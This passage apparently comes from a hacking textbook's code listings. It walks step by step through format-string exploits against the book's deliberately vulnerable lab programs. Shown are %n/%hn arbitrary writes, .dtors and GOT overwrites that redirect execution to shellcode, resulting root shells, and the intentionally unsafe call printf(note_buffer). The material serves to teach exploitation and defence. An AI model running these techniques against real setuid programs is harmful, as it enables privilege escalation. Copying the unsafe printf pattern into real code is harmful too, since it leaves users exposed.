input:\n??JUNK??JUNK??JUNK??%x%x%8x%n\nThe wrong way to print user-controlled input:\n??JUNK??JUNK??JUNK??bffff3c0b7fe75fc       0\n[*] test_val @ 0x080497f4 = 52 0x00000034\n[*] next_val @ 0x080497f8 = 286331153 0x11111111\nreader@hacking:~/booksrc $ gdb -q --batch -ex \"p 0xcd - 52 + 8\"\n$1 = 161\nreader@hacking:~/booksrc $ ./fmt_vuln2 $(printf \"\\xf4\\x97\\x04\\x08JUNK\\xf5\\x97\\x04\\x08JUNK\\\nxf6\\\nx97\\x04\\x08JUNK\\xf7\\x97\\x04\\x08\")%x%x%161x%n\nThe right way to print user-controlled input:\n??JUNK??JUNK??JUNK??%x%x%161x%n\nThe wrong way to print user-controlled input:\n??JUNK??JUNK??JUNK??bffff3b0b7fe75fc\n                                       0\n[*] test_val @ 0x080497f4 = 205 0x000000cd\n[*] next_val @ 0x080497f8 = 286331153 0x11111111\nreader@hacking:~/booksrc $ gdb -q --batch -ex \"p 0xab - 0xcd\"\n$1 = -34 \nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ gdb -q --batch -ex \"p 0x1ab - 0xcd\"\n$1 = 222\nreader@hacking:~/booksrc $ gdb -q --batch -ex \"p /d 0x1ab\"\n$1 = 427\nreader@hacking:~/booksrc $ ./fmt_vuln2 $(printf \"\\xf4\\x97\\x04\\x08JUNK\\xf5\\x97\\x04\\x08JUNK\\\nxf6\\\nx97\\x04\\x08JUNK\\xf7\\x97\\x04\\x08\")%x%x%161x%n%222x%n\nThe right way to print user-controlled input:\n??JUNK??JUNK??JUNK??%x%x%161x%n%222x%n\nThe wrong way to print user-controlled input:\n??JUNK??JUNK??JUNK??bffff3b0b7fe75fc\n                                       0\n                                                      4b4e554a\n[*] test_val @ 0x080497f4 = 109517 0x0001abcd\n[*] next_val @ 0x080497f8 = 286331136 0x11111100\nreader@hacking:~/booksrc $ gdb -q --batch -ex \"p 0x06 - 0xab\"\n$1 = -165\nreader@hacking:~/booksrc $ gdb -q --batch -ex \"p 0x106 - 0xab\"\n$1 = 91\nreader@hacking:~/booksrc $ ./fmt_vuln2 $(printf \"\\xf4\\x97\\x04\\x08JUNK\\xf5\\x97\\x04\\x08JUNK\\\nxf6\\\nx97\\x04\\x08JUNK\\xf7\\x97\\x04\\x08\")%x%x%161x%n%222x%n%91x%n\nThe right way to print user-controlled input:\n??JUNK??JUNK??JUNK??%x%x%161x%n%222x%n%91x%n\nThe wrong way to print user-controlled input:\n??JUNK??JUNK??JUNK??bffff3b0b7fe75fc\n                                       0\n                                                    4b4e554a\n                           4b4e554a\n[*] test_val @ 0x080497f4 = 33991629 0x0206abcd\n[*] next_val @ 0x080497f8 = 286326784 0x11110000\nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ gdb -q --batch -ex \"p 0x08 - 0x06\"\n$1 = 2\nreader@hacking:~/booksrc $ ./fmt_vuln2 $(printf \"\\xf4\\x97\\x04\\x08JUNK\\xf5\\x97\\x04\\x08JUNK\\\nxf6\\\nx97\\x04\\x08JUNK\\xf7\\x97\\x04\\x08\")%x%x%161x%n%222x%n%91x%n%2x%n\nThe right way to print user-controlled input:\n??JUNK??JUNK??JUNK??%x%x%161x%n%222x%n%91x%n%2x%n\nThe wrong way to print user-controlled input:\n??JUNK??JUNK??JUNK??bffff3a0b7fe75fc\n                                  0\n                                                      4b4e554a\n                           4b4e554a4b4e554a\n[*] test_val @ 0x080497f4 = 235318221 0x0e06abcd\n[*] next_val @ 0x080497f8 = 285212674 0x11000002 \nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ gdb -q --batch -ex \"p 0x108 - 0x06\"\n$1 = 258\nreader@hacking:~/booksrc $ ./fmt_vuln2 $(printf \"\\xf4\\x97\\x04\\x08JUNK\\xf5\\x97\\x04\\x08JUNK\\\nxf6\\\nx97\\x04\\x08JUNK\\xf7\\x97\\x04\\x08\")%x%x%161x%n%222x%n%91x%n%258x%n\nThe right way to print user-controlled input:\n??JUNK??JUNK??JUNK??%x%x%161x%n%222x%n%91x%n%258x%n\nThe wrong way to print user-controlled input:\n??JUNK??JUNK??JUNK??bffff3a0b7fe75fc\n                                  0\n                                                      4b4e554a\n                           4b4e554a\n                                                                  4b4e554a\n[*] test_val @ 0x080497f4 = 134654925 0x0806abcd\n[*] next_val @ 0x080497f8 = 285212675 0x11000003\nreader@hacking:~/booksrc $\n```", "```\nprintf(\"7th: %7$d, 4th: %4$05d \\n\", 10, 20, 30, 40, 50, 60, 70, 80);\n```", "```\n7th: 70, 4th: 00040\n```", "```\nreader@hacking:~/booksrc $ ./fmt_vuln AAAA%x%x%x%x\nThe right way to print user-controlled input:\nAAAA%x%x%x%x\nThe wrong way to print user-controlled input:\nAAAAbffff3d0b7fe75fc041414141\n[*] test_val @ 0x08049794 = -72 0xffffffb8\nreader@hacking:~/booksrc $ ./fmt_vuln AAAA%4\\$x\nThe right way to print user-controlled input:\nAAAA%4$x\nThe wrong way to print user-controlled input:\nAAAA41414141\n[*] test_val @ 0x08049794 = -72 0xffffffb8 \nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ ./fmt_vuln $(perl -e 'print \"\\x94\\x97\\x04\\x08\" . \"\\x95\\x97\\x04\\\nx08\"\n. \"\\x96\\x97\\x04\\x08\" . \"\\x97\\x97\\x04\\x08\"')%4\\$n\nThe right way to print user-controlled input:\n????????%4$n\nThe wrong way to print user-controlled input:\n????????\n[*] test_val @ 0x08049794 = 16 0x00000010\nreader@hacking:~/booksrc $ gdb -q\n(gdb) p 0x72 - 16\n`$1 = 98`\n(gdb) p 0xfd - 0x72\n`$2 = 139`\n(gdb) p 0xff - 0xfd\n$3 = 2\n(gdb) p 0x1ff - 0xfd\n`$4 = 258`\n(gdb) p 0xbf - 0xff\n$5 = -64\n(gdb) p 0x1bf - 0xff\n`$6 = 192`\n(gdb) quit\nreader@hacking:~/booksrc $ ./fmt_vuln $(perl -e 'print \"\\x94\\x97\\x04\\x08\" . \"\\x95\\x97\\x04\\\nx08\"\n. \"\\x96\\x97\\x04\\x08\" . \"\\x97\\x97\\x04\\x08\"')%98x%4\\$n%139x%5\\$n\nThe right way to print user-controlled input:\n????????%98x%4$n%139x%5$n\nThe wrong way to print user-controlled input:\n????????\n                                                                 bffff3c0\n                                                 b7fe75fc\n[*] test_val @ 0x08049794 = 64882 0x0000fd72\nreader@hacking:~/booksrc $ ./fmt_vuln $(perl -e 'print \"\\x94\\x97\\x04\\x08\" . \"\\x95\\x97\\x04\\\nx08\"\n. \"\\x96\\x97\\x04\\x08\" . \"\\x97\\x97\\x04\\x08\"')%98x%4\\$n%139x%5\\$n%258x%6\\$n%192x%7\\$n\nThe right way to print user-controlled input:\n????????%98x%4$n%139x%5$n%258x%6$n%192x%7$n\nThe wrong way to print user-controlled input:\n???????? \n                                                                bffff3b0\n                                                 b7fe75fc\n                            0\n                                   8049794\n[*] test_val @ 0x08049794 = -1073742478 0xbffffd72\nreader@hacking:~/booksrc $\n```", "```\n\tThe length modifier\n\t    Here, integer conversion stands for d, i, o, u, x, or X conversion.\n\n\t    h      A following integer conversion corresponds to a short int or\n\t           unsigned short int argument, or a following n conversion\n\t           corresponds to a pointer to a short int argument.\n```", "```\nreader@hacking:~/booksrc $ ./fmt_vuln $(printf \"\\x94\\x97\\x04\\x08\")%x%x%x%hn\nThe right way to print user-controlled input:\n??%x%x%x%hn\nThe wrong way to print user-controlled input:\n??bffff3d0b7fe75fc0\n[*] test_val @ 0x08049794 = -65515 0xffff 0015\nreader@hacking:~/booksrc $ ./fmt_vuln $(printf \"\\x96\\x97\\x04\\x08\")%x%x%x%hn\nThe right way to print user-controlled input:\n??%x%x%x%hn\nThe wrong way to print user-controlled input:\n??bffff3d0b7fe75fc0\n[*] test_val @ 0x08049794 = 1441720  0x0015ffb8\nreader@hacking:~/booksrc $ ./fmt_vuln $(printf \"\\x96\\x97\\x04\\x08\")%4\\$hn\nThe right way to print user-controlled input:\n??%4$hn\nThe wrong way to print user-controlled input:\n??\n[*] test_val @ 0x08049794 = 327608 0x0004ffb8 \nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ gdb -q\n(gdb) p 0xfd72 - 8\n$1 = 64874\n(gdb) p 0xbfff - 0xfd72\n$2 = -15731\n(gdb) p 0x1bfff - 0xfd72\n$3 = 49805\n(gdb) quit\nreader@hacking:~/booksrc $ ./fmt_vuln $(printf \"\\x94\\x97\\x04\\x08\\x96\\x97\\x04\\x08\")\n%64874x%4\\\n$hn%49805x%5\\$hn\nThe right way to print user-controlled input:\n????%64874x%4$hn%49805x%5$hn\nThe wrong way to print user-controlled input:\nb7fe75fc\n[*] test_val @ 0x08049794 = -1073742478 0xbffffd72 \nreader@hacking:~/booksrc $\n```", "```\n(gdb) p 0xbfff - 8\n$1 = 49143\n(gdb) p 0xfd72 - 0xbfff\n$2 = 15731\n(gdb) quit\nreader@hacking:~/booksrc $ ./fmt_vuln $(printf \"\\x96\\x97\\x04\\x08\\x94\\x97\\x04\\x08\")\n%49143x%4\\\n$hn%15731x%5\\$hn\nThe right way to print user-controlled input:\n????%49143x%4$hn%15731x%5$hn\nThe wrong way to print user-controlled input:\n????\n\n                                                       b7fe75fc\n[*] test_val @ 0x08049794 = -1073742478 0xbffffd72\nreader@hacking:~/booksrc $\n```", "```\n#include <stdio.h>\n#include <stdlib.h>\n\nstatic void cleanup(void) __attribute__ ((destructor));\n\nmain() {\n   printf(\"Some actions happen in the main() function..\\n\");\n   printf(\"and then when main() exits, the destructor is called..\\n\");\n\n   exit(0);\n}\n\nvoid cleanup(void) {\n   printf(\"In the cleanup function now..\\n\"); \n}\n```", "```\nreader@hacking:~/booksrc $ gcc -o dtors_sample dtors_sample.c\nreader@hacking:~/booksrc $ ./dtors_sample\nSome actions happen in the main() function..\nand then when main() exits, the destructor is called..\nIn the cleanup() function now.. \nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ nm ./dtors_sample\n080495bc d _DYNAMIC\n08049688 d _GLOBAL_OFFSET_TABLE_\n080484e4 R _IO_stdin_used\n         w _Jv_RegisterClasses\n080495a8 d __CTOR_END__\n080495a4 d __CTOR_LIST__ \n080495b4 d __DTOR_END__\n080495ac d __DTOR_LIST__\n080485a0 r __FRAME_END__\n080495b8 d __JCR_END__\n080495b8 d __JCR_LIST__\n080496b0 A __bss_start\n080496a4 D __data_start\n08048480 t __do_global_ctors_aux\n08048340 t __do_global_dtors_aux\n080496a8 D __dso_handle\n         w __gmon_start__\n08048479 T __i686.get_pc_thunk.bx\n080495a4 d __init_array_end\n080495a4 d __init_array_start\n08048400 T __libc_csu_fini\n08048410 T __libc_csu_init\n         U __libc_start_main@@GLIBC_2.0\n080496b0 A _edata\n080496b4 A _end\n080484b0 T _fini\n080484e0 R _fp_hw\n0804827c T _init\n080482f0 T _start\n08048314 t call_gmon_start\n`080483e8 t cleanup`\n080496b0 b completed.1\n080496a4 W data_start\n         U exit@@GLIBC_2.0\n08048380 t frame_dummy\n080483b4 T main\n080496ac d p.0\n         U printf@@GLIBC_2.0 \nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ objdump -s -j .dtors ./dtors_sample\n\n./dtors_sample:     file format elf32-i386\n\nContents of section .dtors:\n 80495ac `ffffffff e8830408 00000000`           ............\nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ objdump -h ./dtors_sample\n\n./dtors_sample:     file format elf32-i386\n\nSections:\nIdx Name          Size      VMA       LMA       File off  Algn\n  0 .interp       00000013  08048114  08048114  00000114  2**0\n                  CONTENTS, ALLOC, LOAD, READONLY, DATA\n  1 .note.ABI-tag 00000020  08048128  08048128  00000128  2**2\n                  CONTENTS, ALLOC, LOAD, READONLY, DATA\n  2 .hash         0000002c  08048148  08048148  00000148  2**2\n                  CONTENTS, ALLOC, LOAD, READONLY, DATA\n  3 .dynsym       00000060  08048174  08048174  00000174  2**2\n                  CONTENTS, ALLOC, LOAD, READONLY, DATA\n  4 .dynstr       00000051  080481d4  080481d4  000001d4  2**0\n                  CONTENTS, ALLOC, LOAD, READONLY, DATA\n  5 .gnu.version  0000000c  08048226  08048226  00000226  2**1\n                  CONTENTS, ALLOC, LOAD, READONLY, DATA\n  6 .gnu.version_r 00000020  08048234  08048234  00000234  2**2\n                  CONTENTS, ALLOC, LOAD, READONLY, DATA\n  7 .rel.dyn      00000008  08048254  08048254  00000254  2**2\n                  CONTENTS, ALLOC, LOAD, READONLY, DATA\n  8 .rel.plt      00000020  0804825c  0804825c  0000025c  2**2\n                  CONTENTS, ALLOC, LOAD, READONLY, DATA\n  9 .init         00000017  0804827c  0804827c  0000027c  2**2\n                  CONTENTS, ALLOC, LOAD, READONLY, CODE\n 10 .plt          00000050  08048294  08048294  00000294  2**2\n                  CONTENTS, ALLOC, LOAD, READONLY, CODE\n 11 .text         000001c0  080482f0  080482f0  000002f0  2**4\n                  CONTENTS, ALLOC, LOAD, READONLY, CODE\n 12 .fini         0000001c  080484b0  080484b0  000004b0  2**2\n                  CONTENTS, ALLOC, LOAD, READONLY, CODE\n 13 .rodata       000000bf  080484e0  080484e0  000004e0  2**5\n                  CONTENTS, ALLOC, LOAD, READONLY, DATA\n 14 .eh_frame     00000004  080485a0  080485a0  000005a0  2**2\n                  CONTENTS, ALLOC, LOAD, READONLY, DATA\n 15 .ctors        00000008  080495a4  080495a4  000005a4  2**2\n                  CONTENTS, ALLOC, LOAD, DATA\n 16 .dtors        0000000c  080495ac  080495ac  000005ac  2**2\n                  CONTENTS, ALLOC, LOAD, DATA\n 17 .jcr          00000004  080495b8  080495b8  000005b8  2**2\n                  CONTENTS, ALLOC, LOAD, DATA\n 18 .dynamic      000000c8  080495bc  080495bc  000005bc  2**2\n                  CONTENTS, ALLOC, LOAD, DATA\n 19 .got          00000004  08049684  08049684  00000684  2**2\n                  CONTENTS, ALLOC, LOAD, DATA\n 20 .got.plt      0000001c  08049688  08049688  00000688  2**2\n                  CONTENTS, ALLOC, LOAD, DATA\n 21 .data         0000000c  080496a4  080496a4  000006a4  2**2\n                  CONTENTS, ALLOC, LOAD, DATA\n 22 .bss          00000004  080496b0  080496b0  000006b0  2**2\n                  ALLOC\n 23 .comment      0000012f  00000000  00000000  000006b0  2**0\n                  CONTENTS, READONLY\n 24 .debug_aranges 00000058  00000000  00000000  000007e0  2**3\n                  CONTENTS, READONLY, DEBUGGING\n 25 .debug_pubnames 00000025  00000000  00000000  00000838  2**0\n                  CONTENTS, READONLY, DEBUGGING\n 26 .debug_info   000001ad  00000000  00000000  0000085d  2**0\n                  CONTENTS, READONLY, DEBUGGING\n 27 .debug_abbrev 00000066  00000000  00000000  00000a0a  2**0\n                  CONTENTS, READONLY, DEBUGGING\n 28 .debug_line   0000013d  00000000  00000000  00000a70  2**0\n                  CONTENTS, READONLY, DEBUGGING\n 29 .debug_str    000000bb  00000000  00000000  00000bad  2**0\n                  CONTENTS, READONLY, DEBUGGING\n 30 .debug_ranges 00000048  00000000  00000000  00000c68  2**3\n                  CONTENTS, READONLY, DEBUGGING \nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ nm ./fmt_vuln | grep DTOR\n08049694 d __DTOR_END__\n08049690 d __DTOR_LIST__\nreader@hacking:~/booksrc $ objdump -s -j .dtors ./fmt_vuln\n\n./fmt_vuln:     file format elf32-i386\n\nContents of section .dtors:\n 8049690 ffffffff 00000000                    ........\nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ export SHELLCODE=$(cat shellcode.bin)\nreader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./fmt_vuln\nSHELLCODE will be at 0xbffff9ec\nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ gdb -q\n(gdb) p 0xbfff - 8\n$1 = 49143\n(gdb) p 0xf9ec - 0xbfff\n$2 = 14829\n(gdb) quit\nreader@hacking:~/booksrc $ nm ./fmt_vuln | grep DTOR\n`08049694` d __DTOR_END__\n08049690 d __DTOR_LIST__\nreader@hacking:~/booksrc $ ./fmt_vuln $(printf \"\\x96\\x96\\x04\\x08\\x94\\x96\\x04\\\nx08\")%49143x%4\\$hn%14829x%5\\$hn\nThe right way to print user-controlled input:\n????%49143x%4$hn%14829x%5$hn\nThe wrong way to print user-controlled input:\n????\n\n                                                        b7fe75fc\n[*] test_val @ 0x08049794 = -72 0xffffffb8\nsh-3.2# whoami\nroot \nsh-3.2#\n```", "```\nint print_notes(int fd, int uid, char *searchstring) {\n   int note_length;\n   char byte=0, note_buffer[100];\n\n   note_length = find_user_note(fd, uid);\n   if(note_length == -1)  // If end of file reached,\n      return 0;           //   return 0.\n\n   read(fd, note_buffer, note_length); // Read note data.\n   note_buffer[note_length] = 0;       // Terminate the string.\n\n   if(search_note(note_buffer, searchstring)) // If searchstring found,\n      `printf(note_buffer);`                    //   print the note.\n   return 1; \n}\n```", "```\nreader@hacking:~/booksrc $ ./notetaker AAAA$(perl -e 'print \"%x.\"x10')\n[DEBUG] buffer   @ 0x804a008: 'AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.'\n[DEBUG] datafile @ 0x804a070: '/var/notes'\n[DEBUG] file descriptor is 3\nNote has been saved.\nreader@hacking:~/booksrc $ ./notesearch AAAA\n[DEBUG] found a 34 byte note for user id 999\n[DEBUG] found a 41 byte note for user id 999\n[DEBUG] found a 5 byte note for user id 999\n[DEBUG] found a 35 byte note for user id 999\nAAAAbffff750.23.20435455.37303032.0.0.1.41414141.252e7825.78252e78 .\n-------[ end of note data ]-------\nreader@hacking:~/booksrc $ ./notetaker BBBB%8\\$x\n[DEBUG] buffer   @ 0x804a008: 'BBBB%8$x'\n[DEBUG] datafile @ 0x804a070: '/var/notes'\n[DEBUG] file descriptor is 3\nNote has been saved.\nreader@hacking:~/booksrc $ ./notesearch BBBB\n[DEBUG] found a 34 byte note for user id 999\n[DEBUG] found a 41 byte note for user id 999\n[DEBUG] found a 5 byte note for user id 999\n[DEBUG] found a 35 byte note for user id 999\n[DEBUG] found a 9 byte note for user id 999\nBBBB42424242\n-------[ end of note data ]------- \nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ export SHELLCODE=$(cat shellcode.bin)\nreader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./notesearch\nSHELLCODE will be at 0xbffff9e8\nreader@hacking:~/booksrc $ gdb -q\n(gdb) p 0xbfff - 8\n$1 = 49143\n(gdb) p 0xf9e8 - 0xbfff\n$2 = 14825\n(gdb) quit\nreader@hacking:~/booksrc $ nm ./notesearch | grep DTOR\n08049c60 d __DTOR_END__\n08049c5c d __DTOR_LIST__\nreader@hacking:~/booksrc $ ./notetaker $(printf \"\\x62\\x9c\\x04\\x08\\x60\\x9c\\x04\\\nx08\")%49143x%8\\$hn%14825x%9\\$hn\n[DEBUG] buffer   @ 0x804a008: 'b?`?%49143x%8$hn%14825x%9$hn'\n[DEBUG] datafile @ 0x804a070: '/var/notes'\n[DEBUG] file descriptor is 3\nNote has been saved.\nreader@hacking:~/booksrc $ ./notesearch 49143x\n[DEBUG] found a 34 byte note for user id 999\n[DEBUG] found a 41 byte note for user id 999\n[DEBUG] found a 5 byte note for user id 999\n[DEBUG] found a 35 byte note for user id 999\n[DEBUG] found a 9 byte note for user id 999\n[DEBUG] found a 33 byte note for user id 999\n\n                                        21\n-------[ end of note data ]-------\nsh-3.2# whoami\nroot\nsh-3.2#\n```", "```\nreader@hacking:~/booksrc $ objdump -d -j .plt ./fmt_vuln\n\n./fmt_vuln:     file format elf32-i386\n\nDisassembly of section .plt:\n\n080482b8 <__gmon_start__@plt-0x10>:\n 80482b8:       ff 35 6c 97 04 08       pushl  0x804976c\n 80482be:       ff 25 70 97 04 08       jmp    *0x8049770\n 80482c4:       00 00                   add    %al,(%eax)\n        ...\n\n080482c8 <__gmon_start__@plt>:\n 80482c8:       ff 25 74 97 04 08       jmp    *0x8049774\n 80482ce:       68 00 00 00 00          push   $0x0\n 80482d3:       e9 e0 ff ff ff          jmp    80482b8 <_init+0x18>\n\n080482d8 <__libc_start_main@plt>:\n 80482d8:       ff 25 78 97 04 08       jmp    *0x8049778\n 80482de:       68 08 00 00 00          push   $0x8\n 80482e3:       e9 d0 ff ff ff          jmp    80482b8 <_init+0x18>\n\n080482e8 <strcpy@plt>:\n 80482e8:       ff 25 7c 97 04 08       jmp    *0x804977c\n 80482ee:       68 10 00 00 00          push   $0x10\n 80482f3:       e9 c0 ff ff ff          jmp    80482b8 <_init+0x18>\n\n080482f8 <printf@plt>:\n 80482f8:       ff 25 80 97 04 08       jmp    *0x8049780\n 80482fe:       68 18 00 00 00          push   $0x18\n 8048303:       e9 b0 ff ff ff          jmp    80482b8 <_init+0x18>\n\n08048308 <exit@plt>:\n 8048308:       ff 25 84 97 04 08       jmp    *0x8049784\n 804830e:       68 20 00 00 00          push   $0x20\n 8048313:       e9 a0 ff ff ff          jmp    80482b8 <_init+0x18> \nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ objdump -h ./fmt_vuln | grep -A1 \"\\ .plt\\ \"\n 10 .plt          00000060  080482b8  080482b8  000002b8  2**2 \n                  CONTENTS, ALLOC, LOAD, READONLY, CODE\n```", "```\n080482f8 <printf@plt>:\n 80482f8:       ff 25 80 97 04 08       jmp     `*0x8049780`\n 80482fe:       68 18 00 00 00          push   $0x18\n 8048303:       e9 b0 ff ff ff          jmp    80482b8 <_init+0x18>\n\n08048308 <exit@plt>:\n 8048308:       ff 25 84 97 04 08       jmp     `*0x8049784`\n 804830e:       68 20 00 00 00          push   $0x20 \n 8048313:       e9 a0 ff ff ff          jmp    80482b8 <_init+0x18>\n```", "```\nreader@hacking:~/booksrc $ objdump -R ./fmt_vuln\n\n./fmt_vuln:     file format elf32-i386\n\nDYNAMIC RELOCATION RECORDS\nOFFSET   TYPE              VALUE \n08049764 R_386_GLOB_DAT    __gmon_start__\n08049774 R_386_JUMP_SLOT   __gmon_start__\n08049778 R_386_JUMP_SLOT   __libc_start_main\n0804977c R_386_JUMP_SLOT   strcpy\n08049780 R_386_JUMP_SLOT   printf\n`08049784 R_386_JUMP_SLOT   exit`\n\nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ export SHELLCODE=$(cat shellcode.bin)\nreader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./fmt_vuln\nSHELLCODE will be at  0xbffff9ec\nreader@hacking:~/booksrc $ gdb -q\n(gdb) p 0xbfff - 8\n$1 = 49143\n(gdb) p 0xf9ec - 0xbfff\n$2 = 14829\n(gdb) quit\nreader@hacking:~/booksrc $ objdump -R ./fmt_vuln\n\n./fmt_vuln:     file format elf32-i386\n\nDYNAMIC RELOCATION RECORDS\nOFFSET   TYPE              VALUE \n08049764 R_386_GLOB_DAT    __gmon_start__\n08049774 R_386_JUMP_SLOT   __gmon_start__\n08049778 R_386_JUMP_SLOT   __libc_start_main\n0804977c R_386_JUMP_SLOT   strcpy\n08049780 R_386_JUMP_SLOT   printf \n 08049784 R_386_JUMP_SLOT   exit\n\nreader@hacking:~/booksrc $ ./fmt_vuln $(printf \"\\x86\\x97\\x04\\x08\\x84\\x97\\x04\\\nx08\")%49143x%4\\$hn%14829x%5\\$hn\nThe right way to print user-controlled input:\n????%49143x%4$hn%14829x%5$hn\nThe wrong way to print user-controlled input:\n????\n\n                                                         b7fe75fc\n[*] test_val @ 0x08049794 = -72 0xffffffb8\nsh-3.2# whoami\nroot \nsh-3.2#\n```"]